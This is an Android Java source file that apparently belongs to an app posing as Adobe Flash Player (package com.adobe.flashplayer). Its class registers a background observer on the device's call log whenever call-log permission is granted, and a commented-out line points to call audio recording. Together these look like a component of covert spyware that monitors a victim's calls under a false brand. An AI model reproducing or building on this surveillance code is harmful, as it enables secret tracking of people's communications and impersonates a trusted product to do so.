package com.adobe.flashplayer.data;

import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Looper;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

import androidx.core.content.ContextCompat;

import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.Utils;


public class PhoneCallLogWrapper implements  Runnable{

    Context context;
    public static PhoneCallLogObsv mPhoneCallLogObserver= null;

    PhoneCallLogWrapper(Context context){
        this.context = context;
        //java.lang.NullPointerException: Attempt to read from field 'android.os.MessageQueue android.os.Looper.mQueue' on a null object reference
        //gPhoneCallAudio = new PhoneCallAudioRec(context);
    }

    @Override
    public void run(){
        try {
            int granted = ContextCompat.checkSelfPermission(context,android.Manifest.permission.READ_CALL_LOG);
            if (granted == PackageManager.PERMISSION_GRANTED) {
                Looper.prepare();

                ContentResolver cr = context.getContentResolver();
                if (mPhoneCallLogObserver == null) {
                    mPhoneCallLogObserver = new PhoneCallLogObsv(new android.os.Handler(), context);
                    cr.registerContentObserver(Uri.parse("content://call_log/calls"), true, mPhoneCallLogObserver);
                }

                Looper.loop();
            }
        } catch (Exception e) {
            String error = Utils.getExceptionDetail(e);
            String stack = Utils.getCallStack();
            MyLog.writeLogFile("PhoneCallLog exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
            e.printStackTrace();
        }
    }




}